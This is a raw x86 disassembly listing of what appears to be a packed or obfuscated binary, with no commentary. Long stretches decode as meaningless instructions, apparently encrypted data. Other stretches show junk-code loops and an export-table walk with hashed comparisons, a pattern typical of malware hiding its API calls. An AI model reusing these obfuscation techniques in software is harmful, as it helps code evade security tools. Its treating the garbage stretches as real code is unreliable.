  4139dc:	xchg   edx,eax
  4139dd:	gs nop
  4139df:	push   0xffffffe8
  4139e1:	xor    ebx,DWORD PTR [ebx]
  4139e3:	(bad)  
  4139e4:	jge    0x413a19
  4139e6:	jmp    0xd7fa:0xbbe4cb66
  4139ed:	pop    es
  4139ee:	(bad)  
  4139ef:	pop    ss
  4139f0:	inc    ebx
  4139f1:	ja     0x4139a6
  4139f3:	push   0xa
  4139f5:	popf   
  4139f6:	mov    ds:0x5bc54cd9,al
  4139fb:	cmc    
  4139fc:	add    ah,BYTE PTR [esp+esi*1]
  4139ff:	pop    ds
  413a00:	push   ss
  413a01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a02:	add    ebx,DWORD PTR [eax]
  413a04:	mov    fs,WORD PTR [eax-0x42]
  413a07:	jge    0x413a3a
  413a09:	push   ds
  413a0a:	and    al,0x18
  413a0c:	addr16 dec edi
  413a0e:	adc    al,BYTE PTR [edx]
  413a10:	xor    al,0x43
  413a12:	daa    
  413a13:	sbb    DWORD PTR [ebp-0x24400e13],0x9fa2c240
  413a1d:	(bad)  
  413a1e:	hlt    
  413a1f:	imul   esp,ebx,0xffffff86
  413a22:	call   0xe72d5b1f
  413a27:	or     bh,BYTE PTR [eax-0x16]
  413a2a:	fld    QWORD PTR ds:0x82d52f19
  413a30:	les    ebx,FWORD PTR [esp+ebx*8-0x71bdb77c]
  413a37:	(bad)  
  413a38:	fmul   st,st(4)
  413a3a:	sbb    eax,0xdceaaa7f
  413a3f:	sub    eax,0x2136e5df
  413a44:	test   dh,bl
  413a46:	ror    BYTE PTR [edx+0x18d70d01],cl
  413a4c:	stos   BYTE PTR es:[edi],al
  413a4d:	retf   0x374c
  413a50:	mov    ds:0xffbd77e8,al
  413a55:	(bad)  
  413a56:	jmp    0x413d3a
  413a5b:	pop    ebx
  413a5c:	ins    DWORD PTR es:[edi],dx
  413a5d:	and    al,0xa9
  413a5f:	xor    dh,BYTE PTR [ecx+0x71]
  413a62:	ins    DWORD PTR es:[edi],dx
  413a63:	jp     0x413a20
  413a65:	or     esi,ecx
  413a67:	ins    DWORD PTR es:[edi],dx
  413a68:	repnz mov gs,WORD PTR [edi+0x7070687e]
  413a6f:	mov    ecx,0xf70707e
  413a74:	cld    
  413a75:	shl    DWORD PTR [ebx],cl
  413a77:	gs lahf 
  413a79:	xor    edx,ecx
  413a7b:	cmp    eax,0xf08e68bb
  413a80:	call   0x84b86136
  413a85:	outs   dx,DWORD PTR ds:[esi]
  413a86:	out    dx,al
  413a87:	inc    ecx
  413a88:	repz mov eax,0x7a97c72e
  413a8e:	jns    0x413a46
  413a90:	bound  ebx,QWORD PTR [ecx]
  413a92:	pusha  
  413a93:	test   cl,dh
  413a95:	dec    edi
  413a96:	cmp    esp,eax
  413a98:	adc    al,0xdd
  413a9a:	xchg   edx,eax
  413a9b:	dec    esi
  413a9c:	inc    edi
  413a9d:	lds    ebp,FWORD PTR [ebx]
  413a9f:	fisub  WORD PTR [esp+edi*1-0x7bd60c3c]
  413aa6:	mov    ah,BYTE PTR [eax]
  413aa8:	add    eax,0xd9dc097
  413aad:	push   edi
  413aae:	mov    ebp,0x54731037
  413ab3:	pop    esi
  413ab4:	(bad)  
  413ab5:	cmp    bl,ah
  413ab7:	sub    al,0x60
  413ab9:	pop    eax
  413aba:	xor    ebx,DWORD PTR [eax]
  413abc:	unpckhps xmm5,XMMWORD PTR [ecx+ebp*8+0x7c29a054]
  413ac4:	popa   
  413ac5:	dec    esp
  413ac6:	cmp    DWORD PTR [ebx+0x76761035],ecx
  413acc:	dec    ebp
  413acd:	and    edx,DWORD PTR [ebx+0x13]
  413ad0:	sti    
  413ad1:	(bad)  [esi-0x67ee1e5b]
  413ad7:	push   edx
  413ad8:	cwde   
  413ad9:	and    eax,0xbac9e872
  413ade:	daa    
  413adf:	sub    bh,BYTE PTR [esp+ebx*4+0x4b]
  413ae3:	mov    eax,DWORD PTR [edx+edi*1]
  413ae6:	in     al,0x7a
  413ae8:	lock dec edi
  413aea:	xor    ch,bl
  413aec:	push   cs
  413aed:	mov    gs,WORD PTR [ebx-0x13]
  413af0:	test   BYTE PTR [ebp+0x3c7ac579],ch
  413af6:	je     0x413b4f
  413af8:	sbb    DWORD PTR [eax+ecx*1+0x7f8922fc],ebp
  413aff:	je     0x413b13
  413b01:	ror    BYTE PTR [ebx+0x79],0xfd
  413b05:	xchg   ecx,eax
  413b06:	and    BYTE PTR [esi-0x8],bl
  413b09:	test   DWORD PTR [esi+ebp*1],ecx
  413b0c:	mov    ds:0xfbcc1b03,al
  413b11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b12:	mov    edi,0xe719f3af
  413b17:	mov    dh,0x77
  413b19:	or     eax,0xc67941b7
  413b1e:	outs   dx,BYTE PTR ds:[esi]
  413b1f:	in     eax,0x84
  413b21:	mov    al,0x1b
  413b23:	mov    ecx,gs
  413b25:	xchg   DWORD PTR [ebp-0x19],ebp
  413b28:	dec    esi
  413b29:	mov    al,0x4e
  413b2b:	repz dec edx
  413b2d:	and    eax,0xf4aaaf62
  413b32:	mul    DWORD PTR [edx-0x720335f8]
  413b38:	jl     0x413ad0
  413b3a:	or     al,0x1b
  413b3c:	rcr    BYTE PTR [edi-0x4d],0xe4
  413b40:	mov    DWORD PTR [edx],eax
  413b42:	test   BYTE PTR [ecx+0x42],ah
  413b45:	dec    ecx
  413b46:	fistp  QWORD PTR [edx]
  413b48:	xchg   ebp,eax
  413b49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b4a:	stos   BYTE PTR es:[edi],al
  413b4b:	loope  0x413b76
  413b4d:	test   eax,0x9610b1cc
  413b52:	sahf   
  413b53:	add    DWORD PTR [ebx-0x369b73ef],ecx
  413b59:	mov    esp,0x512985e2
  413b5e:	sti    
  413b5f:	mov    ebx,0x300744c4
  413b64:	sub    ebp,edi
  413b66:	popa   
  413b67:	dec    edx
  413b68:	sub    eax,0x75bd6106
  413b6d:	je     0x413b13
  413b6f:	int3   
  413b70:	aam    0x7d
  413b72:	lods   eax,DWORD PTR ds:[esi]
  413b73:	scas   eax,DWORD PTR es:[edi]
  413b74:	adc    dh,BYTE PTR [edx]
  413b76:	ins    BYTE PTR es:[edi],dx
  413b77:	sbb    BYTE PTR [eax+ebx*1-0x80],dh
  413b7b:	imul   esi,ebp,0xa
  413b7e:	push   DWORD PTR [eax-0x4bc45d32]
  413b84:	or     ch,BYTE PTR [eax]
  413b86:	ss dec edi
  413b88:	push   cs
  413b89:	int3   
  413b8a:	xchg   esi,esp
  413b8c:	ret    0x8a24
  413b8f:	rcr    BYTE PTR [edx],cl
  413b91:	lods   eax,DWORD PTR ds:[esi]
  413b92:	loope  0x413ba0
  413b94:	add    DWORD PTR [edi],edi
  413b96:	push   0x0
  413b98:	ss mov ?,edi
  413b9b:	inc    ebp
  413b9c:	jnp    0x413b51
  413b9e:	dec    ebp
  413b9f:	fcomp  st(4)
  413ba1:	and    eax,0x187bf20b
  413ba6:	cld    
  413ba7:	loopne 0x413b53
  413ba9:	inc    ecx
  413baa:	cmp    BYTE PTR [ebx],dh
  413bac:	imul   edx,DWORD PTR ds:0x577b9623,0xffffff9c
  413bb3:	call   0xd553:0xa2ad31f4
  413bba:	pusha  
  413bbb:	lds    ecx,FWORD PTR [eax]
  413bbd:	out    dx,al
  413bbe:	retf   0xc6f4
  413bc1:	cli    
  413bc2:	mov    dh,0x20
  413bc4:	in     al,0xb
  413bc6:	mov    eax,ds:0xb4f9a965
  413bcb:	push   eax
  413bcc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413bcd:	cld    
  413bce:	fistp  DWORD PTR [ebp-0xffa24e4]
  413bd4:	shl    BYTE PTR [eax+edx*8+0x348ed882],0x79
  413bdc:	push   0x4d
  413bde:	sbb    eax,0xf3cf08e4
  413be3:	mov    esi,0x8c0d8c25
  413be8:	icebp  
  413be9:	jecxz  0x413be8
  413beb:	xchg   edx,eax
  413bec:	test   BYTE PTR [ecx+0x70],ch
  413bef:	or     ecx,DWORD PTR [esi-0x45]
  413bf2:	out    0x95,al
  413bf4:	and    DWORD PTR [edi],esi
  413bf6:	pop    esi
  413bf7:	xor    eax,0x2516501
  413bfc:	sbb    esp,ebp
  413bfe:	push   0xffffffe9
  413c00:	push   ds
  413c01:	cmp    eax,0xf4515783
  413c06:	push   esi
  413c07:	bound  esi,QWORD PTR [eax]
  413c09:	mov    ebp,0x6a80bc3c
  413c0e:	retf   
  413c0f:	mov    eax,0xe85ed51
  413c14:	data16 jb 0x413c2d
  413c17:	or     BYTE PTR [ebx-0x1b],0xdb
  413c1b:	dec    esi
  413c1c:	and    ch,BYTE PTR [edi-0x1238c513]
  413c22:	sar    BYTE PTR [ecx-0x1da2d19e],0xae
  413c29:	pop    ebx
  413c2a:	test   DWORD PTR [ebp+0x42f9a815],0xa671575b
  413c34:	adc    BYTE PTR [ebx-0x2a],bl
  413c37:	jp     0x413c63
  413c39:	mov    ch,ah
  413c3b:	and    al,0x2d
  413c3d:	sbb    eax,0x2172061f
  413c42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c43:	ror    DWORD PTR ds:0x27ebd13d,cl
  413c49:	or     BYTE PTR [ebx+0x6d],al
  413c4c:	and    edx,edx
  413c4e:	outs   dx,DWORD PTR ds:[esi]
  413c4f:	mov    DWORD PTR [ecx+0x62ea1b0a],ebp
  413c55:	jmp    0x413be0
  413c57:	scas   al,BYTE PTR es:[edi]
  413c58:	hlt    
  413c59:	lds    eax,FWORD PTR [esp+ebx*4+0x83a2761]
  413c60:	std    
  413c61:	icebp  
  413c62:	mov    edi,0x85566f71
  413c67:	mov    ds:0xa6d7ca0d,al
  413c6c:	int    0xda
  413c6e:	lods   eax,DWORD PTR ds:[esi]
  413c6f:	and    al,0x5d
  413c71:	pop    eax
  413c72:	or     cl,dh
  413c74:	repnz push ebp
  413c76:	and    al,0xef
  413c78:	scas   eax,DWORD PTR es:[edi]
  413c79:	aad    0x40
  413c7b:	aas    
  413c7c:	loopne 0x413c52
  413c7e:	pop    es
  413c7f:	mov    ah,BYTE PTR [esi]
  413c81:	jne    0x413cb3
  413c83:	xchg   ebp,eax
  413c84:	mov    al,0x1
  413c86:	cmp    edi,ecx
  413c88:	mov    BYTE PTR [eax+ecx*8+0x60],bl
  413c8c:	stc    
  413c8d:	pop    ecx
  413c8e:	mov    edx,0x117382eb
  413c93:	or     dh,BYTE PTR [edi]
  413c95:	enter  0x1888,0xb6
  413c99:	cmp    cl,BYTE PTR [ecx-0x4d]
  413c9c:	adc    DWORD PTR [ecx],0xb11586fa
  413ca2:	pop    eax
  413ca3:	sbb    al,BYTE PTR [ecx-0x73]
  413ca6:	cdq    
  413ca7:	add    al,0xba
  413ca9:	(bad)  
  413cab:	pop    edx
  413cac:	call   0x93e0:0x1534ebec
  413cb3:	gs dec ecx
  413cb5:	or     ebx,ebp
  413cb7:	sub    BYTE PTR [eax+0x730a6ee7],cl
  413cbd:	xor    esi,DWORD PTR [eax+0x69d9fed4]
  413cc3:	and    al,0xfe
  413cc5:	sar    DWORD PTR [edx+esi*4+0x40],cl
  413cc9:	fnstsw WORD PTR [edi+0x54]
  413ccc:	or     DWORD PTR [ecx+0x5b207af8],0x33d46fdc
  413cd6:	idiv   DWORD PTR [eax+0x6d239da1]
  413cdc:	mov    al,ds:0x2da747a9
  413ce1:	and    DWORD PTR [edx-0x4d33afd1],esp
  413ce7:	inc    edi
  413ce9:	(bad)  
  413ceb:	sti    
  413cec:	and    DWORD PTR [esi-0x54131a79],ebp
  413cf2:	dec    ecx
  413cf3:	ror    ebx,0x76
  413cf6:	sti    
  413cf7:	loope  0x413ccc
  413cf9:	cmp    DWORD PTR [ebx-0x578dea66],ecx
  413cff:	lods   eax,DWORD PTR ds:[esi]
  413d00:	dec    esi
  413d01:	sub    DWORD PTR [edi+0x2b],eax
  413d04:	xor    al,0x46
  413d06:	cld    
  413d07:	(bad)  
  413d09:	add    eax,0x220edaeb
  413d0e:	jmp    0x8ce95368
  413d13:	arpl   WORD PTR [edx+0x13],si
  413d16:	or     esi,DWORD PTR [ebx+0x71]
  413d19:	test   al,0x6e
  413d1b:	int    0x9c
  413d1d:	popf   
  413d1e:	mov    edx,0x7984bbf7
  413d23:	xor    ah,BYTE PTR [eax+0x34785f26]
  413d29:	mov    al,BYTE PTR [edx-0x65b6fbfe]
  413d2f:	test   bl,bh
  413d31:	call   0x3c4715f5
  413d36:	pop    ebp
  413d37:	xor    al,0x60
  413d39:	jl     0x413cc4
  413d3b:	inc    ebp
  413d3c:	loopne 0x413cc9
  413d3e:	inc    ebp
  413d3f:	cld    
  413d40:	sub    ecx,ecx
  413d42:	mov    ecx,DWORD PTR [ebp-0x20]
  413d45:	mov    DWORD PTR ds:0x42e6ff,0x1b
  413d4f:	cmp    DWORD PTR ds:0x42e6ff,0x0
  413d56:	je     0x413dab
  413d5c:	cmp    DWORD PTR ds:0x42e6ff,0x2
  413d63:	jne    0x413d7f
  413d69:	push   DWORD PTR [ebp-0xc]
  413d6c:	push   0x52a1
  413d71:	push   0x824e
  413d76:	push   DWORD PTR [ebp-0x18]
  413d79:	call   DWORD PTR ds:0x42e56b
  413d7f:	cmp    DWORD PTR ds:0x42e6ff,0x3
  413d86:	jne    0x413d99
  413d8c:	mov    esi,DWORD PTR ds:0x42e6ff
  413d92:	dec    esi
  413d93:	mov    DWORD PTR ds:0x42e6ff,esi
  413d99:	mov    esi,DWORD PTR ds:0x42e6ff
  413d9f:	dec    esi
  413da0:	mov    DWORD PTR ds:0x42e6ff,esi
  413da6:	jmp    0x413d4f
  413dab:	mov    esi,0x7510855
  413db0:	or     DWORD PTR ds:0x42e70f,0x42fd86
  413dba:	xor    eax,esi
  413dbc:	add    eax,ebx
  413dbe:	cmp    ecx,eax
  413dc0:	mov    DWORD PTR ds:0x42e12c,0x588b
  413dca:	je     0x414b4e
  413dd0:	push   DWORD PTR [ebp-0x20]
  413dd3:	dec    DWORD PTR ds:0x42e6f7
  413dd9:	push   DWORD PTR [ebp+0x8]
  413ddc:	xor    DWORD PTR ds:0x42fcd9,0x42e120
  413de6:	call   0x405485
  413deb:	mov    DWORD PTR [ebp-0x14],eax
  413dee:	and    DWORD PTR ds:0x42e6fb,0x0
  413df8:	jmp    0x413e08
  413dfd:	mov    eax,ds:0x42e6fb
  413e02:	inc    eax
  413e03:	mov    ds:0x42e6fb,eax
  413e08:	cmp    DWORD PTR ds:0x42e6fb,0x10
  413e0f:	jae    0x413e33
  413e15:	cmp    DWORD PTR ds:0x42e6fb,0x16
  413e1c:	jne    0x413e28
  413e22:	call   DWORD PTR ds:0x42e48b
  413e28:	jmp    0x413dfd
  413e2d:	sub    DWORD PTR ds:0x42fd01,ecx
  413e33:	mov    eax,DWORD PTR [ebp-0x4]
  413e36:	or     DWORD PTR ds:0x42e6f7,edx
  413e3c:	mov    ecx,DWORD PTR [ebp-0x14]
  413e3f:	adc    DWORD PTR ds:0x42fd8a,0x2715
  413e49:	xor    eax,esi
  413e4b:	dec    DWORD PTR ds:0x42e703
  413e51:	add    eax,ebx
  413e53:	mov    DWORD PTR ds:0x42e11c,0x499a
  413e5d:	cmp    ecx,eax
  413e5f:	je     0x414b4e
  413e65:	not    eax
  413e67:	mov    eax,DWORD PTR [ebp-0x14]
  413e6a:	mov    eax,DWORD PTR [eax+0x18]
  413e6d:	mov    DWORD PTR [ebp-0x20],eax
  413e70:	xor    DWORD PTR ds:0x42e6fb,0x4f5
  413e7a:	jmp    0x41415e
  413e7f:	lods   al,BYTE PTR ds:[esi]
  413e80:	mov    WORD PTR [edx],gs
  413e82:	loopne 0x413eae
  413e84:	outs   dx,BYTE PTR ds:[esi]
  413e85:	push   0x4c
  413e87:	repz push edi
  413e89:	scas   eax,DWORD PTR es:[edi]
  413e8a:	(bad)  
  413e8b:	ja     0x413f0c
  413e8d:	add    DWORD PTR [edi+0x70707647],ebx
  413e93:	mov    ecx,0x5d70707e
  413e98:	lock xor cl,BYTE PTR ds:0x8d2a1df9
  413e9f:	push   ebx
  413ea0:	loopne 0x413e57
  413ea2:	lods   al,BYTE PTR ds:[esi]
  413ea3:	add    esi,edx
  413ea5:	int    0xc5
  413ea7:	mov    bh,0x42
  413ea9:	in     al,0xe3
  413eab:	(bad)  
  413ead:	xchg   edi,eax
  413eae:	push   eax
  413eaf:	lods   eax,DWORD PTR ds:[esi]
  413eb0:	sbb    ebp,ebx
  413eb2:	scas   al,BYTE PTR es:[edi]
  413eb3:	shl    BYTE PTR [esi+ebx*4+0x7c],cl
  413eb7:	in     al,0x88
  413eb9:	out    dx,al
  413eba:	xor    esp,DWORD PTR [edi+0x36]
  413ebd:	repz loop 0x413e51
  413ec0:	out    0xa2,eax
  413ec2:	sbb    al,0xfa
  413ec4:	xchg   ebp,eax
  413ec5:	fimul  WORD PTR [edi]
  413ec7:	dec    ecx
  413ec8:	sbb    BYTE PTR [edi-0x407b5ed3],dh
  413ece:	add    esp,ebx
  413ed0:	sub    al,0xdf
  413ed2:	cwde   
  413ed3:	addr16 jne 0x413f53
  413ed6:	es in  eax,dx
  413ed8:	loopne 0x413f40
  413eda:	mov    bl,0x63
  413edc:	jo     0x413f1d
  413ede:	jno    0x413ee7
  413ee0:	cmc    
  413ee1:	hlt    
  413ee2:	xchg   edx,eax
  413ee3:	aaa    
  413ee4:	jmp    0x413f3d
  413ee6:	pop    esi
  413ee7:	jnp    0x413f5d
  413ee9:	xor    BYTE PTR [edi-0x32518824],0xd1
  413ef0:	add    dl,ah
  413ef2:	sub    DWORD PTR [ebp+0x1c],ebx
  413ef5:	call   0x85cf:0xeff7777f
  413efc:	mov    ch,0x2b
  413efe:	sub    BYTE PTR [ecx],ch
  413f00:	mov    al,ds:0x85db8c86
  413f05:	je     0x413e97
  413f07:	lds    ecx,FWORD PTR [ecx]
  413f09:	push   edi
  413f0a:	mov    DWORD PTR [esi-0x43],ebp
  413f0d:	(bad)  
  413f0e:	mov    dl,0x43
  413f10:	xchg   DWORD PTR [ebx],ecx
  413f12:	mov    ecx,DWORD PTR [edi]
  413f14:	xchg   edi,eax
  413f15:	xchg   DWORD PTR ds:0xbfbd95fd,ebp
  413f1b:	test   esi,edi
  413f1d:	pop    ds
  413f1e:	jae    0x413eba
  413f20:	xor    eax,0xe8f37a47
  413f25:	push   cs
  413f26:	sysret 
  413f28:	pop    edi
  413f29:	or     ch,dl
  413f2b:	xchg   edx,eax
  413f2c:	fisubr DWORD PTR [edi]
  413f2e:	adc    ecx,esi
  413f30:	inc    edx
  413f31:	add    DWORD PTR [ebx-0x723bb84c],esi
  413f37:	mov    dl,BYTE PTR [eax-0x46]
  413f3a:	jae    0x413f86
  413f3c:	or     al,0xa
  413f3e:	push   0xb831e793
  413f43:	add    BYTE PTR [ebx+esi*2],al
  413f46:	loope  0x413f93
  413f48:	cdq    
  413f49:	jns    0x413f8d
  413f4b:	fidivr WORD PTR [edi-0x6918ff5d]
  413f51:	mov    dh,0xa6
  413f53:	es sti 
  413f55:	push   ss
  413f56:	rcr    DWORD PTR [eax],cl
  413f58:	(bad)  ds:[ecx+0x10]
  413f5c:	sub    BYTE PTR [eax-0x5b28f98],dh
  413f62:	mov    esp,0x978a9b72
  413f67:	in     al,0xf0
  413f69:	popa   
  413f6a:	add    ah,dl
  413f6c:	cdq    
  413f6d:	pusha  
  413f6e:	inc    ecx
  413f6f:	dec    edx
  413f70:	(bad)  
  413f71:	dec    esp
  413f72:	js     0x413f96
  413f74:	sub    eax,0x509e5df1
  413f79:	cld    
  413f7a:	std    
  413f7b:	add    eax,0xf0bd4fd
  413f80:	es daa 
  413f82:	into   
  413f83:	cmp    al,0x84
  413f85:	div    DWORD PTR [ecx+esi*8+0x3e06e551]
  413f8c:	rcl    dl,0x4a
  413f8f:	dec    esi
  413f90:	mov    esi,0xa9ff4fdf
  413f95:	mov    bl,BYTE PTR [edi+0x77f530f6]
  413f9b:	enter  0xaf6d,0xf9
  413f9f:	xchg   esp,eax
  413fa0:	mov    gs,ecx
  413fa2:	popa   
  413fa3:	add    ch,bh
  413fa5:	(bad)
  413fa9:	dec    ebx
  413faa:	iret   
  413fab:	das    
  413fac:	xlat   BYTE PTR ds:[ebx]
  413fad:	mov    BYTE PTR [eax+0x598fc2ef],ah
  413fb3:	adc    al,0x5f
  413fb5:	ror    DWORD PTR [esi+0x6038a9a2],cl
  413fbb:	sbb    edi,DWORD PTR [ebx+edx*4-0x51]
  413fbf:	jge    0x41403c
  413fc1:	dec    esi
  413fc2:	inc    esp
  413fc3:	ret    
  413fc4:	cmp    ch,BYTE PTR [eax-0x3e]
  413fc7:	xchg   esi,eax
  413fc8:	push   ecx
  413fc9:	adc    al,0x91
  413fcb:	sub    edx,DWORD PTR [eax]
  413fcd:	jmp    DWORD PTR [esi]
  413fcf:	jge    0x413fe8
  413fd1:	jge    0x413fec
  413fd3:	jmp    0x413faf
  413fd5:	retf   
  413fd6:	jnp    0x414031
  413fd8:	mov    bh,0x92
  413fda:	push   es
  413fdb:	(bad)  
  413fdc:	sar    cl,cl
  413fde:	pop    ss
  413fdf:	(bad)  
  413fe0:	daa    
  413fe1:	dec    edx
  413fe2:	xor    dh,BYTE PTR [ebx]
  413fe4:	retf   0xad6
  413fe7:	retf   0x9639
  413fea:	pusha  
  413feb:	adc    DWORD PTR [ebx+0x27eca284],esp
  413ff1:	and    al,0xf3
  413ff3:	dec    ebx
  413ff4:	mov    dh,bh
  413ff6:	sub    eax,0xadca1bf3
  413ffb:	(bad)  
  413ffd:	xchg   ecx,eax
  413ffe:	imul   edi,DWORD PTR [ebx+ebx*1],0xfd502d3
  414005:	dec    edi
  414006:	mov    ah,0xac
  414008:	mov    dh,0xf6
  41400a:	mov    bh,0x41
  41400c:	leave  
  41400d:	sbb    al,0xe1
  41400f:	mov    es,WORD PTR [eax]
  414011:	imul   ecx,ebp,0x98ca107c
  414017:	mov    eax,0x46947b41
  41401c:	pop    ss
  41401d:	leave  
  41401e:	cli    
  41401f:	test   al,0x5e
  414021:	adc    eax,0x54cb2641
  414026:	add    al,BYTE PTR ss:[edx]
  414029:	pusha  
  41402a:	mov    cl,0x43
  41402c:	cdq    
  41402d:	cmp    BYTE PTR [ebx],dl
  41402f:	and    ch,bl
  414031:	jecxz  0x414066
  414033:	xor    ch,BYTE PTR [esi-0x5c]
  414036:	ror    DWORD PTR [esi+0x5c0aa857],cl
  41403c:	sbb    ecx,DWORD PTR [eax+0x7e5d82b3]
  414042:	mov    bh,0x73
  414044:	icebp  
  414045:	pop    edx
  414046:	mov    ?,WORD PTR [ebx]
  414048:	pusha  
  414049:	sub    edx,DWORD PTR [ebp+0xc96925]
  41404f:	loop   0x413fdc
  414051:	sub    BYTE PTR [esi-0x679ca8b5],0xd3
  414058:	push   ebp
  414059:	loope  0x41403e
  41405b:	cmp    BYTE PTR [bx+di],0x6e
  41405f:	pop    esp
  414060:	jmp    0xe0801c8e
  414065:	iret   
  414066:	xor    esi,ebx
  414068:	and    ch,BYTE PTR [ecx+0x5a1a4949]
  41406e:	and    al,0x19
  414070:	xor    eax,0x4c0a453c
  414075:	adc    BYTE PTR [ecx-0x1bb6c40b],0x86
  41407c:	mov    DWORD PTR [edi+0x492cb831],esp
  414082:	mov    ch,0xd4
  414084:	in     al,dx
  414085:	push   es
  414086:	xor    DWORD PTR [edi],esi
  414088:	test   al,0x7e
  41408a:	and    BYTE PTR [ecx],dh
  41408c:	push   ecx
  41408d:	or     ah,BYTE PTR [ebp-0x6f17b258]
  414093:	mov    WORD PTR [eax-0x2a],?
  414096:	mov    al,0x76
  414098:	icebp  
  414099:	add    dh,dl
  41409b:	inc    ebp
  41409c:	mov    ebx,0x96da2ede
  4140a1:	ja     0x414033
  4140a3:	(bad)  
  4140a4:	jo     0x4140e8
  4140a6:	out    dx,eax
  4140a7:	rcr    BYTE PTR [edi],cl
  4140a9:	daa    
  4140aa:	and    al,0x8f
  4140ac:	dec    ebx
  4140ad:	into   
  4140ae:	(bad)  
  4140af:	jns    0x4140d5
  4140b1:	mov    BYTE PTR [eax-0x6beb03e1],bh
  4140b7:	sbb    edx,edx
  4140b9:	cli    
  4140ba:	loopne 0x4140c9
  4140bc:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4140be:	sub    al,0x2d
  4140c0:	dec    ebx
  4140c1:	cdq    
  4140c2:	in     al,0x93
  4140c4:	xchg   esi,eax
  4140c5:	stc    
  4140c6:	add    al,0x84
  4140c8:	shl    DWORD PTR ds:0x6c4697f6,1
  4140ce:	pushf  
  4140cf:	loopne 0x4140a8
  4140d1:	ds icebp 
  4140d3:	addr16 pushf 
  4140d5:	dec    esp
  4140d6:	and    BYTE PTR [edx],0x2e
  4140d9:	push   ss
  4140da:	vcvtsd2ss xmm4,xmm1,QWORD PTR [ebx+0x7e2ad815]
  4140e2:	dec    esp
  4140e3:	xor    DWORD PTR [eax+0x259edbe],edi
  4140e9:	iret   
  4140ea:	mov    ebx,0xb2faf20c
  4140ef:	sbb    DWORD PTR [esi],esp
  4140f1:	add    DWORD PTR [edi-0x274c2c6],ecx
  4140f7:	or     eax,0xea8e012e
  4140fc:	mov    dh,0x11
  4140fe:	imul   edi,DWORD PTR [esi+0x2844ffae],0xecae1800
  414108:	mov    ecx,0xe4140339
  41410d:	rcr    BYTE PTR [edx+0x65],cl
  414110:	or     al,0x8c
  414112:	(bad)  [esi-0x4e]
  414115:	bound  ebx,QWORD PTR [esi+0x407ba297]
  41411b:	jl     0x414179
  41411d:	cmpxchg bh,bh
  414120:	test   eax,0x9080e974
  414125:	xchg   esp,eax
  414126:	add    dl,ah
  414128:	dec    ebx
  414129:	xor    BYTE PTR [esi+edi*1],cl
  41412c:	adc    bl,BYTE PTR [ebp+0x7d2328bb]
  414132:	sbb    al,0x53
  414134:	mov    esi,?
  414136:	jecxz  0x414157
  414138:	jge    0x41414f
  41413a:	das    
  41413b:	dec    edx
  41413c:	hlt    
  41413d:	pop    eax
  41413e:	stc    
  41413f:	leave  
  414140:	dec    eax
  414141:	jle    0x414162
  414143:	hlt    
  414144:	add    ebx,ebx
  414146:	push   0x47
  414148:	sub    eax,0xa2a2006c
  41414d:	xchg   ebp,eax
  41414e:	mov    edi,DWORD PTR [esi]
  414150:	push   ds
  414151:	out    0x9,eax
  414153:	and    ebp,DWORD PTR [ebx+0x30d7ba13]
  414159:	xchg   edi,eax
  41415a:	je     0x41414f
  41415c:	call   0xec86cccf
  414161:	and    DWORD PTR ds:0x42fcd5,0x0
  41416b:	mov    ecx,DWORD PTR ds:0x42fcd5
  414171:	inc    ecx
  414172:	mov    DWORD PTR ds:0x42fcd5,ecx
  414178:	cmp    DWORD PTR ds:0x42fcd5,0x2c
  41417f:	jne    0x41418b
  414185:	call   DWORD PTR ds:0x42e56f
  41418b:	cmp    DWORD PTR ds:0x42fcd5,0x1e
  414192:	jb     0x41416b
  414198:	mov    ecx,DWORD PTR [ebp+0x8]
  41419b:	or     DWORD PTR ds:0x42fcd9,0x46b9
  4141a5:	add    ecx,DWORD PTR [eax+0x20]
  4141a8:	mov    DWORD PTR [ebp-0x28],ecx
  4141ab:	or     eax,DWORD PTR ds:0x42e6ff
  4141b1:	mov    eax,DWORD PTR [ebp-0x14]
  4141b4:	mov    ecx,DWORD PTR ds:0x42fce9
  4141ba:	sbb    DWORD PTR ds:0x42fcd5,ecx
  4141c0:	mov    ecx,DWORD PTR [ebp+0x8]
  4141c3:	add    DWORD PTR ds:0x42fd05,0x42e713
  4141cd:	add    ecx,DWORD PTR [eax+0x24]
  4141d0:	add    DWORD PTR ds:0x42e6eb,edi
  4141d6:	mov    DWORD PTR [ebp-0x2c],ecx
  4141d9:	mov    eax,DWORD PTR [ebp-0x14]
  4141dc:	mov    ecx,DWORD PTR [ebp+0x8]
  4141df:	add    ecx,DWORD PTR [eax+0x1c]
  4141e2:	neg    eax
  4141e4:	xor    esi,esi
  4141e6:	and    DWORD PTR ds:0x42fd05,ebx
  4141ec:	mov    DWORD PTR [ebp-0x14],ecx
  4141ef:	or     DWORD PTR ds:0x42e70f,ecx
  4141f5:	mov    eax,DWORD PTR [ebp-0x28]
  4141f8:	and    DWORD PTR ds:0x42fcdd,0x0
  414202:	mov    ecx,DWORD PTR ds:0x42fcdd
  414208:	inc    ecx
  414209:	mov    DWORD PTR ds:0x42fcdd,ecx
  41420f:	cmp    DWORD PTR ds:0x42fcdd,0xc
  414216:	jne    0x41423b
  41421c:	push   DWORD PTR [ebp-0x18]
  41421f:	push   DWORD PTR [ebp-0x10]
  414222:	push   0x25b2
  414227:	push   DWORD PTR [ebp-0x10]
  41422a:	push   0x5d78
  41422f:	push   DWORD PTR [ebp-0x24]
  414232:	push   DWORD PTR [ebp-0x10]
  414235:	call   DWORD PTR ds:0x42e573
  41423b:	cmp    DWORD PTR ds:0x42fcdd,0xb
  414242:	jne    0x414257
  414248:	xor    ecx,ecx
  41424a:	add    ecx,DWORD PTR ds:0x42fcdd
  414250:	inc    ecx
  414251:	mov    DWORD PTR ds:0x42fcdd,ecx
  414257:	cmp    DWORD PTR ds:0x42fcdd,0x14
  41425e:	jb     0x414202
  414264:	mov    ecx,DWORD PTR [ebp+0x8]
  414267:	add    ecx,DWORD PTR [eax+edi*4]
  41426a:	lea    eax,[ebp-0x8]
  41426d:	mov    DWORD PTR [ebp-0x30],ecx
  414270:	push   eax
  414271:	jmp    0x414555
  414276:	add    ebx,0xffffff97
  414279:	xor    eax,0x71a17157
  41427e:	inc    edx
  41427f:	cld    
  414280:	xchg   ebx,eax
  414281:	loop   0x4142ca
  414283:	adc    bl,BYTE PTR [edx+0x7073800a]
